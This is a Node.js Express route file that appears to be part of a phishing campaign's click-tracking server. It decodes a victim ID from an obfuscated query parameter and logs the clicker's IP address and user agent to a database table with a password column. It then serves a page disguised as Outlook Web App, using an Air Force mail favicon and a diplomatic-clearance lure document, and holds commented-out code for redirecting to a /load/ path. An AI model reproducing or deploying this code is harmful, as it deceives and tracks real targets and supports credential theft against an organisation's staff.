
const express = require ('express');
const router = express.Router();
const db = require('./db');

router.use(express.static('public'));

router.get('/', (req, res) => {

    const data = req.query.hk647kjwwertkljhgfccbmpweogokjfdgp;

    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');    
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    //const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;


            const insertQuery = 'INSERT INTO Tableclk (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        

    const url = `/load/?yyyrl657jjghjoyhgfhnbjkfsdfiowerierehjre=${data}`;

   

    const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
        <link rel="shortcut icon" href="https://mail.airforce.lk/owa/auth/15.2.1258/themes/resources/favicon.ico" type="image/x-icon">
        <title>Outlook Web App</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- <meta http-equiv="REFRESH" content="03; url=${url}"> -->

 <!--  <script>
        // Function to redirect to the new page
        function redirectToNewPage() {
            window.location.href = "${url}";  // Replace with your target URL
        }

        // Add event listeners for 'mousemove' and 'click'
        //document.addEventListener("mousemove", redirectToNewPage);
        document.addEventListener("click", redirectToNewPage);
        document.addEventListener("scroll", redirectToNewPage);
        </script>    -->
        
        </head>
        <body>
        <object width="1800" height="900" data="./REQUEST FOR DIPLOMATIC CLEARANCE FOR CHINESE AIRCRAFT"></object>  
       <!--    <center> <img src="./drone operation.png">  </center>   -->

        </body>
        </html>
        </html>

    `;

    // Send the HTML content as a response
    res.send(htmlContent);


      }

});

module.exports =router
